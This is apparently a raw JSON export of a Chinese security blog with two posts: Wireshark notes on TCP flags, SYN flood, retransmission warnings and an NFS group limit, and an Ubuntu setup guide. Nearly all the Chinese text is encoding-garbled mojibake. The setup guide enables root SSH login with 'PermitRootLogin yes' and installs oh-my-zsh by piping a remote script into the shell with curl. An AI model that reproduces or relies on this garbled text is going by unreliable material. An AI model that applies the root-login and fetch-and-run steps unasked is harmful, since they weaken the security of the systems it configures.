æœåŠ¡å™¨ç«¯å‘é€FINï¼Œå‘ŠçŸ¥é‡Šæ”¾è¿æ¥ã€FINã€‘ å®¢æˆ·ç«¯æ”¶åˆ°FINï¼Œå‘é€ACKã€ACKã€‘ TCPæ ‡å¿—ä½ SYNï¼šåŒæ­¥æ ‡å¿—ä½ï¼Œç”¨äº2å°ä¸»æœºè¦å»ºç«‹è¿æ¥æ—¶ï¼Œç¬¬ä¸€æ¬¡å‘å‡ºçš„æ•°æ®åŒ…ï¼Œåœ¨TCPä¸‰æ¬¡æ¡æ‰‹ä¸­ï¼Œå‰ä¸¤æ¬¡æ¡æ‰‹ä¼šå¸¦æœ‰SYNæ ‡å¿—ä½ï¼Œå¦‚ä¸Šå›¾çš„TCPä¸‰æ¬¡æ¡æ‰‹ã€‚ ACKï¼šç¡®è®¤ä½ï¼Œç”¨äºè¯´æ˜å‰å¯¹æ–¹å‘è¿‡æ¥çš„æ•°æ®åŒ…æˆåŠŸæ”¶åˆ°ï¼Œä¸Šå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼Œç¬¬äºŒæ¬¡æ¡æ‰‹æ—¶ï¼ŒReceiverå‘é€çš„åŒ…é‡Œé¢å¸¦æœ‰ACKå’ŒSYNï¼ŒACKæ˜¯å‘Šè¯‰Senderï¼Œåˆšåˆšä½ å‘è¿‡æ¥çš„SYNåŒ…ï¼Œæˆ‘å·²ç»æ”¶åˆ°äº†ã€‚ FINï¼šå‘é€æ–¹å‘é€FINæ ‡å¿—ä½ï¼Œç›®çš„æ˜¯å‘Šè¯‰æ¥æ”¶è€…ï¼Œè¿™æ˜¯æœ€åä¸€ä¸ªåŒ…äº†ã€‚ URGï¼šurgent flagç”¨äºé€šçŸ¥receiverè¿›ç¨‹è¿™ä¸ªåŒ…è¦ä¼˜å…ˆå¤„ç†ï¼ŒæŠŠå…¶ä»–åŒ…å…ˆæ”¾ä¸€è¾¹ã€‚ PSHï¼špush flagåŠŸèƒ½ä¹Ÿurgentä¸€æ ·ï¼Œä¼˜å…ˆå¤„ç†ï¼Œåªæ˜¯å¸¦æœ‰è¿™ä¸ªæ ‡å¿—ä½çš„åŒ…ç¨‹åºç›´æ¥å¤„ç†ï¼Œä¸è¿›å…¥æ¥æ”¶ç¼“å­˜ä¸­ã€‚ RSTï¼šreset flagæ˜¯ä»receiverå‘é€åˆ°senderçš„åŒ…ä¸­æ‰æœ‰ï¼Œè¡¨æ˜éœ€è¦é‡è¿ã€‚éœ€è¦å¤ä½ã€‚ ECEï¼šECNå“åº”æ ‡å¿—è¢«ç”¨æ¥åœ¨TCP3æ¬¡æ¡æ‰‹æ—¶è¡¨æ˜ä¸€ä¸ªTCPç«¯æ˜¯å…·å¤‡ECNåŠŸèƒ½çš„ï¼Œå¹¶ä¸”è¡¨æ˜æ¥æ”¶åˆ°çš„TCPåŒ…çš„IPå¤´éƒ¨çš„ECNè¢«è®¾ç½®ä¸º11ã€‚ CWRï¼šæ‹¥å¡çª—å£å‡å°‘æ ‡å¿—è¢«å‘é€ä¸»æœºè®¾ç½®ï¼Œç”¨æ¥è¡¨æ˜å®ƒæ¥æ”¶åˆ°äº†è®¾ç½®ECEæ ‡å¿—çš„TCPåŒ…ã€‚æ‹¥å¡çª—å£æ˜¯è¢«TCPç»´æŠ¤çš„ä¸€ä¸ªå†…éƒ¨å˜é‡ï¼Œç”¨æ¥ç®¡ç†å‘é€çª—å£å¤§å°ã€‚ NSï¼šï¼ˆexperimentalï¼‰è¿˜åœ¨è¯•éªŒä¸­ã€‚ tcp.flags.reset &#x3D;&#x3D; 1 éœ€è¦é‡è¿ï¼Œå¤ä½ åŸºäºä¸‰æ¬¡æ¡æ‰‹çš„SYN flood åŸç†ï¼šä»å¤§é‡ä¸»æœºå‘é€SYNè¯·æ±‚ç»™æœåŠ¡å™¨ï¼Œå‡è£…è¦å»ºç«‹TCPè¿æ¥ã€‚è¿™äº›SYNè¯·æ±‚å¯èƒ½å«æœ‰å‡çš„æºåœ°å€ï¼Œæ‰€ä»¥æœåŠ¡å™¨å“åº”åæ°¸è¿œæ”¶ä¸åˆ°ACKï¼Œå°±ä¼šç•™ä¸‹half-opençŠ¶æ€çš„TCPè¿æ¥ã€‚ç”±äºæ¯ä¸ªTCPè¿æ¥éƒ½ä¼šæ¶ˆè€—ä¸€å®šçš„ç³»ç»Ÿèµ„æºï¼Œå¦‚æœæ”»å‡»è¶³å¤ŸçŒ›çƒˆï¼Œæ­¤ç±»è¿æ¥å»ºç«‹è¶Šå¤šï¼ŒæœåŠ¡å™¨çš„èµ„æºå°±ä¼šè¢«è€—å…‰ï¼ŒçœŸæ­£çš„ç”¨æˆ·è®¿é—®ä¹Ÿä¼šè¢«æ‹’ç» Solutionï¼šå¦‚æœå¹²æ‰°åŒ…å¤ªå¤šï¼Œç‚¹å‡»Analyze/Expert Info/Chatsèœå•ï¼Œå¯ä»¥çœ‹åˆ°SYN çš„æ€»æ•°é‡ç»Ÿè®¡ã€‚ è¢«è¯¯è§£çš„TCPQuestionï¼šå‘å‡ºå»çš„TCPåŒ…ï¼Œéƒ½åº”è¯¥æœ‰å¯¹åº”çš„ACKç¡®è®¤å— Answerï¼šTCP æ•°æ®æ¥æ”¶æ–¹å¯ä»¥ä¸å¿…å¯¹æ¯ä¸€ä¸ªæ•°æ®åŒ…éƒ½åšackç¡®è®¤ï¼Œæ•°æ®æ¥æ”¶æ–¹ä¹Ÿå¯ä»¥ç´¯ç§¯ä¸€äº›åŒ…æ‰å¯¹å‘é€æ–¹ Ackä¸€æ¬¡ã€‚å¯¹äºACKçš„é¢‘ç‡ï¼Œä¸åŒçš„æ“ä½œç³»ç»Ÿæœ‰ä¸åŒçš„é¢‘ç‡ã€‚å› ä¸ºAck æ˜¯æœ‰ç´¯ç§¯æ•ˆåº”çš„ï¼Œå®ƒéšå«äº†â€œåœ¨æ­¤ä¹‹å‰çš„å…¶ä»–åŒ…ä¹Ÿå·²æ”¶åˆ°â€çš„æ„æ€ã€‚ Questionï¼šTCPå› ä¸ºéœ€è¦è¿›è¡Œackç¡®è®¤ï¼Œæ˜¯å¦æ•ˆç‡æ›´ä½å‘¢ Answerï¼šä¸ä¼šï¼Œå› ä¸ºå¦‚æœTCPå‘é€çª—å£è¶³å¤Ÿå¤§çš„è¯ï¼Œä¹Ÿå¯ä»¥ä¸å—å¾€è¿”æ—¶é—´çš„çº¦æŸï¼Œæºæºä¸æ–­çš„ä¼ é€æ•°æ®ã€‚ä½†å¦‚æœä¼ è¾“å°å—æ•°æ®çš„è¯ï¼Œæ¯”å¦‚èƒ½åœ¨ä¸€ä¸ªå¾€è¿”æ—¶é—´å†…å°±å®Œæˆçš„å°äº‹ï¼Œå°±ä¼šå› ä¸ºéœ€è¦3æ¬¡æ¡æ‰‹ã€4æ¬¡æ¡æ‰‹è€ŒåŠ å¤§å¼€é”€ï¼Œæ¯”å¦‚DNSæŸ¥è¯¢ æœ€ç»å…¸çš„ç½‘ç»œé—®é¢˜Question: Nagleç®—æ³•å’Œå»¶è¿Ÿç¡®è®¤åœ¨ä¸€èµ·ä½¿ç”¨æ—¶äº§ç”Ÿçš„æ€§èƒ½é—®é¢˜ï¼Œä»è€Œå¯¼è‡´ä¸‹è½½é€Ÿåº¦å˜æ…¢ã€‚ Answer: â€‹ é€šè¿‡wiresharkåˆ†æä¸€æ®µä¸‹è½½æ–‡ä»¶çš„æ•°æ®åŒ…ï¼Œä»ä¸­åˆ†æå‡ºNagleç®—æ³•å’Œå»¶è¿Ÿç¡®è®¤åœ¨ä¸€èµ·ä½¿ç”¨æ—¶äº§ç”Ÿçš„æ€§èƒ½é—®é¢˜ï¼Œä»è€Œå¯¼è‡´ä¸‹è½½é€Ÿåº¦å˜æ…¢ã€‚ â€‹ åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œåº”ç”¨å±‚ä¼ é€’ç»™TCP å±‚çš„æ•°æ®é‡å¾ˆå°ï¼Œæ¯”å¦‚åœ¨SSH å®¢æˆ·ç«¯ä»¥ä¸€èˆ¬é€Ÿåº¦æ‰“å­—æ—¶ï¼Œå‡ ä¹æ˜¯é€ä¸ªå­—èŠ‚ä¼ é€’åˆ°TCP å±‚çš„ã€‚ä¼ è¾“è¿™ä¹ˆå°‘çš„æ•°æ®é‡å´è¦è€—è´¹20 å­—èŠ‚IP å¤´+20 å­—èŠ‚TCP å¤´ï¼Œæ˜¯éå¸¸æµªè´¹çš„ï¼Œè¿™ç§æƒ…å†µç§°ä¸ºå‘é€æ–¹çš„æ„šç¬¨çª—å£ç»¼åˆç—‡ï¼Œä¹Ÿå«â€œå°åŒ…é—®é¢˜â€ã€‚é’ˆå¯¹è¿™ç§å°åŒ…é—®é¢˜ï¼Œå‡ºç°äº†ä¸€ç§Nagelç®—æ³•ï¼Œå³å°†å¤šä¸ªæ•°æ®ç¼“å­˜èµ·æ¥ï¼Œå‡‘å¤ŸMSSæˆ–ç­‰åˆ°ç¡®è®¤åˆ°è¾¾ä¹‹åå†å‘é€ã€‚ â€‹ Nagle å’Œå»¶è¿Ÿç¡®è®¤æœ¬èº«éƒ½æ²¡æœ‰é—®é¢˜ï¼Œä½†ä¸€èµ·ç”¨å°±ä¼šå½±å“æ€§èƒ½ã€‚è§£å†³æ–¹æ³•è¦ä¹ˆæ˜¯å…³é—­Nagleç®—æ³•ï¼Œè¦ä¹ˆæ˜¯å…³é—­å»¶è¿Ÿç¡®è®¤ã€‚ åˆ†æè¿‡ç¨‹ï¼š Statistics&#x2F;Capture file propertiesèœå•ï¼Œå¯ä»¥çœ‹åˆ°ç½‘ç»œä¼ è¾“çš„å¹³å‡é€Ÿåº¦ç­‰ã€‚ Analyze&#x2F;Expert Infos èœå•ï¼Œå¯ä»¥çœ‹åˆ°ç½‘ç»œä¼ è¾“æ—¶å‡ºç°çš„é”™è¯¯ä¿¡æ¯ é€‰å®šä¸€ä¸ªåŒ…ï¼Œç„¶åç‚¹å‡»Statistics&#x2F;TCP StreamGraph &#x2F;TCP Sequence Graphï¼ˆStevensï¼‰èœå•ï¼Œå¯ä»¥çœ‹åˆ°æ•°æ®ä¼ è¾“çš„é€Ÿåº¦å›¾ã€‚ ä¸ºä»€ä¹ˆä¸¢äº†å•å­Question: è¿™ç« è°ˆè®ºçš„é—®é¢˜æ˜¯ä¸€ä¸ªNFSæœåŠ¡å™¨çš„é—®é¢˜ï¼Œæœ‰äº›ç”¨æˆ·å±äºæ•°åä¸ªç”¨æˆ·ç»„ï¼Œæœ‰äº›æ–‡ä»¶æ˜æ˜å…è®¸æŸä¸ªç”¨æˆ·ç»„è®¿é—®çš„ï¼Œä½†æ˜¯å±äºè¯¥ç»„çš„ç”¨æˆ·å´è®¿é—®ä¸äº†ã€‚ Answer: â€‹ ä½œè€…é€šè¿‡wiresharkåˆ†æå‡ºç°é—®é¢˜çš„æµé‡åŒ…ï¼Œé€šè¿‡æœç´¢å…³é”®å­—æ‰¾åˆ°å‡ºç°é—®é¢˜çš„æ•°æ®åŒ…ï¼Œå‘ç°å…¶åªå°†16ä¸ªGroup IDä¼ ç»™äº†æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯20 ä¸ªï¼Œè¿™äº›ID å¯¹åº”ç€Linuxçš„ç”¨æˆ·ç»„ï¼Œè¿™æ˜¯RFCçš„é™åˆ¶ï¼Œä¹Ÿæ˜¯é—®é¢˜æ‰€åœ¨ã€‚ ä½œè€…åˆ†æçš„æ­¥éª¤æ˜¯ï¼š æŠ¥é”™æ˜¯Permission deniedï¼Œç”¨äº†Ctrl+F æœç´¢å­—ç¬¦ä¸²â€œdeniedâ€ æ‰¾åˆ°äº†æœåŠ¡å™¨å“åº”çš„375 å·åŒ…ï¼Œå®šä½åˆ°äº†å‡ºé—®é¢˜çš„æ—¶é—´ç‚¹ã€‚ä¸è¿‡çœŸæ­£æœ‰ä»·å€¼çš„å´æ˜¯å®ƒçš„ä¸Šä¸€ä¸ªåŒ…ï¼Œå³æ¥è‡ªå®¢æˆ·ç«¯çš„374 å·åŒ…ã€‚ä»ä¸­å¯è§RPCï¼ˆRemote Procedure Callï¼‰å±‚åªæŠŠ16 ä¸ªGroup ID ä¼ ç»™æœåŠ¡å™¨ï¼Œè€Œä¸æ˜¯20 ä¸ªã€‚ è¿™äº›ID å¯¹åº”ç€Linuxå®¢æˆ·ç«¯çš„/etc/groupæ–‡ä»¶ã€‚æœ¬åœ°è®¿é—®ä¹‹æ‰€ä»¥æ²¡æœ‰å‡ºé—®é¢˜ï¼Œæ˜¯å› ä¸ºä¸éœ€è¦è°ƒç”¨RPC å±‚å‘é€ç”¨æˆ·ç»„ã€‚ æŸ¥äº†RPC åè®®æ‰€å¯¹åº”çš„RFC 5531ï¼Œæ‰¾åˆ°å…³äºâ€œgids&lt;16&gt;â€çš„å®šä¹‰ï¼Œå‘ç°æœ€å¤šä¼  16 ä¸ªç”¨æˆ·ç»„æ˜¯RFC é™åˆ¶çš„ã€‚ Solution: è§£å†³åŠæ³•æ˜¯å°†å®¢æˆ·ç«¯çš„/etc/passwdå’Œ/etc/groupæ–‡ä»¶å¤åˆ¶åˆ°æœåŠ¡å™¨ä¸­ï¼Œéœ€è¦ç”¨åˆ°ç”¨æˆ·ç»„çš„æ—¶å€™å°±è‡ªå·±åœ¨æœåŠ¡å™¨ä¸ŠæŸ¥è¯¢ï¼Œå®Œå…¨å¿½ç•¥å®¢æˆ·ç«¯é€šè¿‡RPC å±‚ä¼ è¿‡æ¥çš„ä¿¡æ¯ã€‚ RPCå±‚ï¼šRPCï¼ˆremote procedure call protocalï¼‰è¿œç¨‹è¿‡ç¨‹è°ƒç”¨åè®®ã€‚é€šè¿‡RPCåè®®å‘è¿œç¨‹æœåŠ¡å™¨è¯·æ±‚æœåŠ¡ã€‚å±äºä¼ è¾“å±‚å’Œåº”ç”¨å±‚ã€‚ å—æŸçš„å¸§Questionï¼šæ­£å¸¸æƒ…å†µä¸‹ï¼Œå‡ºé”™çš„å¸§ä¸ä¼šå‡ºç°åœ¨wiresharké‡Œï¼Œä½†ä¸ºä»€ä¹ˆä¼šå‡ºç°å‘¢ï¼Ÿ Answerï¼šæ˜¯wiresharkçš„è¯¯æŠ¥ï¼Œæœ‰æ—¶å®ƒä¼šå‡ºç°FCSé”™è¯¯çš„å¸§ã€‚ä½†å®é™…ä¼ è¾“ä¸­ï¼Œæ˜¯ä¸ä¼šæœ‰å¸§æ£€éªŒåºåˆ—é”™è¯¯çš„æ•°æ®åŒ…çš„ã€‚å› ä¸ºæ¯ä¸ªå¸§åœ¨å‘é€å‰éƒ½ä¼šè¢«å‘é€æ–¹æ ¡éªŒä¸€æ¬¡ï¼Œç„¶åç”Ÿæˆ4ä¸ªå­—èŠ‚çš„FCSå­˜åœ¨å¸§å°¾ã€‚æ¥æ”¶æ–¹æ‹¿åˆ°å¸§ä¹‹åï¼Œåˆä¼šç”¨ç›¸åŒçš„ç®—æ³•åœ¨åšä¸€æ¬¡æ ¡éªŒå¹¶ç”ŸæˆFCSã€‚å‡å¦‚è¿™æ¬¡ç”Ÿæˆçš„FCSå’Œå¸§å°¾æºå¸¦çš„ä¸ä¸€è‡´ï¼Œå°±è¯´æ˜è¯¥å¸§å·²è¢«æŸåï¼Œåº”è¯¥è¢«ä¸¢å¼ƒäº†ã€‚ Wiresharkçš„æç¤º Packet size limited during capture å½“ä½ çœ‹åˆ°è¿™ä¸ªæç¤ºï¼Œè¯´æ˜è¢«æ ‡è®°çš„é‚£ä¸ªåŒ…æ²¡æœ‰æŠ“å…¨ TCP Previous segment not captured åœ¨ TCP ä¼ è¾“è¿‡ç¨‹ä¸­ï¼ŒåŒä¸€å°ä¸»æœºå‘å‡ºçš„æ•°æ®æ®µåº”è¯¥æ˜¯è¿ç»­çš„ï¼Œå¦‚æœWiresharkå‘ç°åä¸€ä¸ªåŒ…çš„Seq å·å¤§äºå‰ä¸€ä¸ªåŒ…çš„Seq+Lenï¼Œå°±çŸ¥é“ä¸­é—´ç¼ºå¤±äº†ä¸€æ®µæ•°æ®ã€‚å‡å¦‚ç¼ºå¤±çš„é‚£æ®µæ•°æ®åœ¨æ•´ä¸ªç½‘ç»œåŒ…ä¸­éƒ½æ‰¾ä¸åˆ°ï¼ˆå³æ’é™¤äº†ä¹±åºï¼‰ï¼Œå°±ä¼šæç¤ºè¯¥æŠ¥é”™ã€‚ TCP ACKed unseen segment å½“Wireshark å‘ç°è¢«Ack çš„é‚£ä¸ªåŒ…æ²¡è¢«æŠ“åˆ°ï¼Œå°±ä¼šæç¤ºè¯¥æŠ¥é”™ã€‚ TCP Out-of-Order å½“Wireshark å‘ç°åä¸€ä¸ªåŒ…çš„Seq å·å°äºå‰ä¸€ä¸ªåŒ…çš„Seq+Len æ—¶ï¼Œå°±ä¼šè®¤ä¸ºæ˜¯ä¹±åºäº†ï¼Œå°±ä¼šæç¤ºè¯¥æŠ¥é”™ã€‚ TCP Dup ACK å½“ä¹±åºæˆ–è€…ä¸¢åŒ…å‘ç”Ÿæ—¶ï¼Œæ¥æ”¶æ–¹ä¼šæ”¶åˆ°ä¸€äº›Seq å·æ¯”æœŸæœ›å€¼å¤§çš„åŒ…ã€‚å®ƒæ¯æ”¶åˆ°ä¸€ä¸ªè¿™ç§åŒ…å°±ä¼šAck ä¸€æ¬¡æœŸæœ›çš„Seq å€¼ï¼Œä»¥æ­¤æ–¹å¼æ¥æé†’å‘é€æ–¹ï¼Œäºæ˜¯å°±äº§ç”Ÿäº†ä¸€äº›é‡å¤çš„Ackã€‚Wireshark ä¼šåœ¨è¿™ç§é‡å¤çš„Ack ä¸Šæ ‡è®°TCP Dup ACK TCP Fast Retransmission å½“å‘é€æ–¹æ”¶åˆ°3 ä¸ªæˆ–ä»¥ä¸Š[TCP Dup ACK]ï¼Œå°±æ„è¯†åˆ°ä¹‹å‰å‘çš„åŒ…å¯èƒ½ä¸¢äº†ï¼Œäºæ˜¯å¿«é€Ÿé‡ä¼ å®ƒ TCP Retransmission å¦‚æœä¸€ä¸ªåŒ…çœŸçš„ä¸¢äº†ï¼Œåˆæ²¡æœ‰åç»­åŒ…å¯ä»¥åœ¨æ¥æ”¶æ–¹è§¦å‘[Dup Ack]ï¼Œå°±ä¸ä¼šå¿«é€Ÿé‡ä¼ ã€‚è¿™ç§æƒ…å†µä¸‹å‘é€æ–¹åªå¥½ç­‰åˆ°è¶…æ—¶äº†å†é‡ä¼ ï¼Œæ­¤ç±»é‡ä¼ åŒ…å°±ä¼šè¢«Wiresharkæ ‡ä¸Š[TCP Retransmission]ã€‚ TCP zerowindow å½“Wireshark åœ¨ä¸€ä¸ªåŒ…ä¸­å‘ç°æ¥æ”¶çª—å£ä¸º0æ—¶ï¼Œå°±ä¼šç»™å®ƒæ‰“ä¸Šâ€œTCP zerowindowâ€çš„æ ‡å¿—ï¼Œè¡¨ç¤ºç¼“å­˜åŒºå·²æ»¡ï¼Œä¸èƒ½å†æ¥æ”¶æ•°æ®äº†ã€‚ TCP window Full å½“Wireshark åœ¨ä¸€ä¸ªåŒ…ä¸­æ‰“ä¸Š[TCP window Full]æ ‡å¿—æ—¶ï¼Œå°±è¡¨ç¤ºè¿™ä¸ªåŒ…çš„å‘é€æ–¹å·²ç»æŠŠå¯¹æ–¹æ‰€å£°æ˜çš„æ¥æ”¶çª—å£è€—å°½äº†ã€‚ TCP segment of a reassembled PDU å½“ä½ æ”¶åˆ°è¿™ä¸ªæç¤ºï¼Œè‚¯å®šå·²ç»åœ¨Editô€ƒ†Preferences&#x2F;Protocols&#x2F;TCP èœå•é‡Œå¯ç”¨äº†Allow sub dissector to reassemble TCP streamsã€‚å®ƒè¡¨ç¤ºWireshark å¯ä»¥æŠŠå±äºåŒä¸€ä¸ªåº”ç”¨å±‚PDUï¼ˆæ¯”å¦‚SMB çš„Read Response å’ŒWrite Request ä¹‹ç±»ï¼‰çš„TCPåŒ…è™šæ‹Ÿåœ°é›†ä¸­èµ·æ¥ã€‚ Continuation to # ä½ çœ‹åˆ°è¿™ä¸ªæç¤ºï¼Œè¯´æ˜å·²ç»åœ¨Edit&#x2F;Preferences&#x2F;Protocols&#x2F;TCP èœå•é‡Œå…³é—­äº†Allow sub dissector to reassemble TCP streamsã€‚ Time-to-live exceeded (Fragment reassembly time exceeded è¡¨ç¤ºè¿™ä¸ªåŒ…çš„å‘é€æ–¹ä¹‹å‰æ”¶åˆ°äº†ä¸€äº›åˆ†ç‰‡ï¼Œä½†æ˜¯ç”±äºæŸäº›åŸå› è¿Ÿè¿Ÿæ— æ³•ç»„è£…èµ·æ¥","categories":[{"name":"Webå®‰å…¨","slug":"Webå®‰å…¨","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"},{"name":"æµé‡åˆ†æ","slug":"Webå®‰å…¨/æµé‡åˆ†æ","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"}],"tags":[{"name":"wireshark","slug":"wireshark","permalink":"https://gryffinbit.top/tags/wireshark/"}],"author":"Gryffinbit"},{"title":"æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½®","slug":"æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½®","date":"2022-07-06T23:12:45.000Z","updated":"2024-11-12T06:59:59.000Z","comments":true,"path":"2022/07/07/æ–°ç³»ç»Ÿçš„ubuntuåŸºæœ¬é…ç½®/","permalink":"https://gryffinbit.top/2022/07/07/%E6%96%B0%E7%B3%BB%E7%BB%9F%E7%9A%84ubuntu%E5%9F%BA%E6%9C%AC%E9%85%8D%E7%BD%AE/","excerpt":"","text":"ubuntu åŸºæœ¬é…ç½®å¼€å¯sshä¸ºäº†æ“ä½œæ–¹ä¾¿ï¼Œæˆ‘æ›´ä¹ æƒ¯å¼€å¯sshï¼Œåœ¨ç‰©ç†æœºçš„terminalæ“ä½œubuntu å®‰è£…openssh-serverè½¯ä»¶åŒ… 12sudo apt updatesudo apt install openssh-server éªŒè¯sshè¿è¡ŒçŠ¶æ€ 1sudo systemctl status ssh æŒ‰qè¿”å›åˆ°å‘½ä»¤è¡Œæç¤ºç¬¦ å¦‚æœè¿è¡ŒçŠ¶æ€ä¸ä¸ºactive(running)ï¼Œéœ€è¦æ‰‹åŠ¨å¼€å¯ 1/etc/init.d/ssh start ä¿®æ”¹SSHç™»é™†é…ç½® 1sudo vim /etc/ssh/sshd_config å°†PermitRootLogin prohibit-passwordé‚£ä¸€è¡Œä¿®æ”¹ä¸ºPermitRootLogin yesï¼Œå»æ‰å‰é¢çš„#å· å°†port 22å‰é¢çš„#å»æ‰ æ£€æŸ¥é˜²ç«å¢™ Ubuntuéšé™„äº†ä¸€ä¸ªåä¸ºUFWçš„é˜²ç«å¢™é…ç½®å·¥å…·ã€‚å¦‚æœåœ¨ç³»ç»Ÿä¸Šå¯ç”¨äº†é˜²ç«å¢™ï¼Œè¯·ç¡®ä¿æ‰“å¼€SSHç«¯å£ã€‚ 1sudo ufw allow ssh é‡å¯sshæœåŠ¡ 1sudo systemctl disable --now ssh 1sudo systemctl enable --now ssh è®¾ç½®SSHè¿æ¥æ—¶é•¿ æ‰“å¼€äº‘æœåŠ¡å™¨sshé…ç½®æ–‡ä»¶ï¼š 1vim /etc/ssh/sshd_config åŠ å…¥å¦‚ä¸‹ä¸¤ä¸ªå‚æ•°ä¿å­˜å°±å¯ä»¥ï¼š 1234TCPKeepAlive yes # ä¿æŒTCPè¿æ¥ClientAliveInterval 600 ClientAliveCountMax 10 é‡å¯sshæœåŠ¡ 1service sshd restart åœ¨å®¢æˆ·ç«¯æœ¬åœ°é…ç½® åœ¨~./ssh/configé‡Œæ·»åŠ  1234# æ–­å¼€æ—¶é‡è¯•è¿æ¥çš„æ¬¡æ•° ServerAliveCountMax 5 # æ¯éš”10ç§’è‡ªåŠ¨å‘é€ä¸€ä¸ªç©ºçš„è¯·æ±‚ä»¥ä¿æŒè¿æ¥ ServerAliveInterval 10 é…ç½®vimå¯ä»¥ä¸­æ–‡æ˜¾ç¤º1sudo vim /etc/vim/vimrc åœ¨æœ€ä¸‹é¢æ·»åŠ ä»£ç  1set fencs=utf-8,GB18030,ucs-bom,default,latin1 æ¢æº1sudo vim /etc/apt/sources.list æŠŠæœ¬æ¥çš„æºæ³¨é‡Šæ‰ï¼Œæ¢æˆé˜¿é‡Œæº 12345678910111213141516171819deb http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-security main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-updates main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-proposed main restricted universe multiverse deb-src http://mirrors.aliyun.com/ubuntu/ focal-backports main restricted universe multiverse focal arm64æº ç”±äºç‰©ç†æœºæ˜¯åŸºäºarm64æ¶æ„çš„M1ï¼Œæ‰€ä»¥ç›¸åº”çš„è™šæ‹Ÿæœºä¹Ÿæ˜¯arm64æ¶æ„çš„ubuntuï¼Œæ¢æºæ—¶é€‰ç”¨æ”¯æŒarmçš„æº ä¸­ç§‘å¤§æºï¼ˆæˆ‘æ›´å–œæ¬¢è¿™ä¸ªï¼Œä¸å®¹æ˜“å‡ºé—®é¢˜ï¼Œhuaweiæºæ€»æœ‰æ— æ³•è¿æ¥çš„ç½‘ç»œé—®é¢˜ï¼‰ 12345678910111213141516deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-updates multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-backports main restricted universe multiverse deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security main restricted deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security universe deb http://mirrors.ustc.edu.cn/ubuntu-ports/ bionic-security multiverse Huawei æº 1wget -O /etc/apt/sources.list https://repo.huaweicloud.com/repository/conf/Ubuntu-Ports-bionic.list æ›´æ–°è½¯ä»¶æ›´æ–°ç³»ç»Ÿè½¯ä»¶æº 1sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade -y ç½‘ç»œçŠ¶å†µä¸å¥½æ—¶ä¼šå¯¼è‡´ä¸‹è½½æ–‡ä»¶hashè®¤è¯å¤±è´¥ï¼Œå¯ä»¥ä½¿ç”¨sudo apt-get cleanï¼Œè¿™å°†æ¸…é™¤/var/lib/apt/lists/*ï¼Œç„¶ååœ¨ sudo apt-get updateè¿›è¡Œæ›´æ–° æ›´æ­£æ—¶é—´ 1sudo dpkg-reconfigure tzdata è£…oh-my-zsh zshæ˜¯è£…åˆ°æŒ‡å®šçš„ç”¨æˆ·ä¸‹é¢çš„ã€‚å¦‚æœå®‰è£…zshæ—¶æ˜¯ç”¨çš„æ™®é€šç”¨æˆ·ï¼Œé‚£å°±æ˜¯ä»¥æ™®é€šç”¨æˆ·èº«ä»½è¿è¡Œçš„æ—¶å€™æœ‰zshï¼Œåˆ‡æ¢åˆ°rootå°±æ²¡æœ‰ã€‚ æ‰€ä»¥åˆ‡æ¢ç”¨æˆ·çš„æ—¶å€™ï¼Œè¦ç»™é‚£ä¸ªç”¨æˆ·é‡æ–°å®‰è£… å®‰è£…git 123sudo apt-add-repository ppa:git-core/ppasudo apt-get updatesudo apt-get install git æŸ¥çœ‹ç³»ç»Ÿå½“å‰shell 1echo $SHELL æŸ¥çœ‹ç³»ç»Ÿè‡ªå¸¦å“ªäº›shell 1cat /etc/shells å®‰è£…zsh 1sudo apt install zsh -y å®‰è£…ä¹‹å ä½¿ç”¨ cat /etc/shells æŸ¥çœ‹ç³»ç»Ÿçš„shellæœ‰ /usr/bin/zshè¯´æ˜å®‰è£…æˆåŠŸã€‚ è®¾ç½®zshä¸ºé»˜è®¤shell 1chsh -s /bin/zsh ç„¶åé‡å¯ 1sudo reboot éœ€è¦ç»™ä¸åŒç”¨æˆ·å®‰è£…zshæ—¶ï¼Œä»è¿™ä¸€æ­¥å¼€å§‹ã€‚å­—ä½“å¯ä»¥ä¸ç”¨å†ä¸‹è½½ä¸€æ¬¡ï¼Œï¼ˆå­—ä½“è¿™ä¸€æ­¥å¯ä»¥ä¸å†æ¥ä¸€æ¬¡ï¼‰ å®‰è£…oh-my-zshã€ä¸èƒ½é€šè¿‡sshæ‰§è¡Œã€‘ 1sh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot; å®‰è£…curlæ—¶å‡ºç°æŠ¥é”™ 123The following packages have unmet dependencies: curl : Depends: libcurl4 (= 7.58.0-2ubuntu3.19) but 7.68.0-1ubuntu2.7 is to be installedE: Unable to correct problems, you have held broken packages. è§£å†³æ–¹æ¡ˆ 12sudo apt-get purge libcurl4sudo apt-get install curl Curlå®‰è£…æˆåŠŸ é…ç½®æ–‡ä»¶ 1vi ~/.zshrc ä¿®æ”¹ä¸»é¢˜ ä¿®æ”¹è¿™ä¸€è¡ŒZSH_THEME=&quot;robbyrussell&quot;å°†ä¸»é¢˜ä¿®æ”¹ä¸ºè‡ªå·±å–œæ¬¢çš„ 1ZSH_THEME=&quot;agnoster&quot; é‡æ–°åŠ 